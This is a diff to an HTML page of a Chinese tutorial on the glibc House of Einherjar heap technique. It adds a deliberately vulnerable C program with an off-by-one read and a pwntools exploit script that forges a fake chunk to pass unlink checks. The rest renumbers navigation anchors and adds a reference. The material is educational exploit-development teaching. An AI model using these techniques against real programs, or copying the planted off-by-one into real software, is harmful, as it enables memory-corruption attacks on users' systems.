@@ -2375,7 +2375,14 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_9" title="总结" class="md-nav__link">
+  <a href="#_9" title="攻击过程示例" class="md-nav__link">
+    攻击过程示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" title="总结" class="md-nav__link">
     总结
   </a>
   
@@ -2395,14 +2402,14 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_10" title="基本功能分析" class="md-nav__link">
+  <a href="#_11" title="基本功能分析" class="md-nav__link">
     基本功能分析
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#_11" title="利用" class="md-nav__link">
+  <a href="#_12" title="利用" class="md-nav__link">
     利用
   </a>
   
@@ -2414,7 +2421,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_12" title="参考文献" class="md-nav__link">
+  <a href="#_13" title="参考文献" class="md-nav__link">
     参考文献
   </a>
   
@@ -2885,7 +2892,14 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_9" title="总结" class="md-nav__link">
+  <a href="#_9" title="攻击过程示例" class="md-nav__link">
+    攻击过程示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" title="总结" class="md-nav__link">
     总结
   </a>
   
@@ -2905,14 +2919,14 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_10" title="基本功能分析" class="md-nav__link">
+  <a href="#_11" title="基本功能分析" class="md-nav__link">
     基本功能分析
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#_11" title="利用" class="md-nav__link">
+  <a href="#_12" title="利用" class="md-nav__link">
     利用
   </a>
   
@@ -2924,7 +2938,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_12" title="参考文献" class="md-nav__link">
+  <a href="#_13" title="参考文献" class="md-nav__link">
     参考文献
   </a>
   
@@ -2987,7 +3001,78 @@
 <p><strong>假设我们将 p1的 prev_size 字段设置为我们想要的目的 chunk 位置与p1的差值</strong>。在溢出后，我们释放p1，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p>
 <p>当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了fake chunk 以便于绕过 unlink 的检测。</p>
 <p><img alt="" src="../../../pwn/heap/figure/einherjar_after_overflow.png" /></p>
-<h3 id="_9">总结<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<h3 id="_9">攻击过程示例<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>可以进行 House Of Einherjar 攻击的代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">s0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>　<span class="c1">//构造fake chunk</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> 
+    <span class="kt">char</span><span class="o">*</span> <span class="n">s2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">);</span>　
+    <span class="kt">char</span><span class="o">*</span> <span class="n">s3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span> <span class="c1">//为了不让s2与top chunk 合并</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;begin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> 
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">s0</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;input s0</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span> <span class="c1">//读入fake chunk</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;input s1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">);</span> <span class="c1">//Off By One</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>攻击代码如下：</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./example&quot;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;begin</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;input s0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0xe0</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">p64(address) * 2是为了绕过</span>
+<span class="sd">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span>
+<span class="sd">  malloc_printerr (&quot;corrupted double-linked list&quot;);  </span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#fake size</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;input s1</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x220</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+
+<p><strong>注意这里绕过unlink检查的方法跟之前利用unlink漏洞时采用的方法不一样</strong></p>
+<p>利用unlink漏洞的时候：</p>
+<div class="codehilite"><pre><span></span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">p</span><span class="o">-</span><span class="mi">3</span><span class="o">*</span><span class="mi">4</span>
+ <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">p</span><span class="o">-</span><span class="mi">2</span><span class="o">*</span><span class="mi">4</span>
+</pre></div>
+
+<p>在这里利用时，因为没有办法找到 <code>&amp;p</code>  ,所以直接让：</p>
+<div class="codehilite"><pre><span></span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">p</span>
+<span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">p</span>
+</pre></div>
+
+<p><strong>这里需要注意一个点：</strong></p>
+<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0xe0</span>
+</pre></div>
+
+<p>其实修改为下面这样也是可以的:</p>
+<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0xe0</span>
+</pre></div>
+
+<p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code>  才合理，但是为什么  <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p>
+<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">P</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      \
+      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>     
+</pre></div>
+
+<p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p>
+<h3 id="_10">总结<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
 <p>这里我们总结下这个利用技术需要注意的地方</p>
 <ul>
 <li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>
@@ -2996,7 +3081,7 @@
 </ul>
 <p>其实，该技术与 chunk extend/shrink 技术比较类似。</p>
 <h2 id="2016-seccon-tinypad">2016 Seccon tinypad<a class="headerlink" href="#2016-seccon-tinypad" title="Permanent link">&para;</a></h2>
-<h3 id="_10">基本功能分析<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<h3 id="_11">基本功能分析<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
 <p>首先，可以看出，程序以来一个核心的读取函数，即读取指定长度字节的字符串，然而，当读取的长度恰好为指定的长度时，会出现 <strong>off by one 的漏洞</strong>。</p>
 <p>通过分析程序，我们不难看出，这个程序的基本功能是操作一个 tinypad，主要有以下操作</p>
 <ul>
@@ -3006,7 +3091,7 @@
 <li>编辑。在编辑时，程序首先根据之前存储的 memo 的内容将其拷贝到 tinypad 的前 256 个字节中，但正如我们之前所说的，当 memo 存储了 256 个字节时，就会存在 off by one漏洞。与此同时，程序利用 strlen 判断复制之后的 tinypad 的内容长度，并将其输出。之后程序继续利用 strlen 求得 memo 的长度，并读取指定长度内容到 tinypad 中，根据读取函数，这里必然出现了 <code>\x00</code>。最后程序将读取到 tinypad 前 256 字节的内容放到对应 memo 中。</li>
 <li>退出</li>
 </ul>
-<h3 id="_11">利用<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<h3 id="_12">利用<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <p>基本利用思路如下</p>
 <ol>
 <li>利用删除时没有将指针置为NULL的 UAF 漏洞，泄漏堆的基地址</li>
@@ -3156,10 +3241,11 @@
     <span class="n">run</span><span class="p">()</span>
 </pre></div>
 
-<h2 id="_12">参考文献<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
+<h2 id="_13">参考文献<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
 <ul>
 <li><a href="https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606">https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606</a></li>
 <li><a href="https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf">https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf</a></li>
+<li><a href="https://bbs.pediy.com/thread-226119.htm">https://bbs.pediy.com/thread-226119.htm</a></li>
 </ul>
                 
                   
